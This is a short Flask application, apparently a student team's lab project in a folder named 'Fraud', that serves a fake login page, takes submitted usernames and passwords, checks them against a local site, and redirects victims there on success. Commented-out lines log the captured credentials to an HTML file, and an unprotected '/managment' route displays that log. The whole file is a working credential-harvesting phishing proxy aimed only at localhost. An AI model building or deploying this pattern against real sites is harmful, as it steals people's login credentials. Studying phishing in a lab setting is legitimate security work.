from flask import Flask, render_template, request, redirect
import json
import requests
from datetime import datetime

app = Flask(__name__)
	




@app.route("/")
def home():

	return render_template('index.html')

@app.route("/", methods=['POST'])
def home_post():
	name = request.form['username']
	password = request.form['password']

	#now = datetime.now()

	#current_time = now.strftime("%H:%M:%S")
	

	#f = open("C:\\Users\\18607\\Desktop\\Fraud\\templates\\log.html", "a")
	#f.write("<p>{} :  {} {} <br></p>".format(current_time, name, password))
	#f.close()


	name = name.encode('utf-8')
	password = password.encode('utf-8')
	url = 'http://127.0.0.1:2222'

	data = {
		"submit":"Sign In",
		"username":name,
		"password":password
	}

	response = requests.post(url, data=data, auth=(name,password)) 
	if ("You Logged In" in ((response.content).decode('utf-8'))):
		if ("Sign In" in request.form["submit"]):
			return redirect("http://127.0.0.1:2222", code=308)

		else:
			return render_template('indexCustom.html')

	return render_template('indexFail.html')

@app.route("/managment")
def management():
	return render_template('log.html')

if __name__ == "__main__":
	app.run()
	#return "<p>TEAM 12: Alexander Pushkar & Anixon Soney<p>"

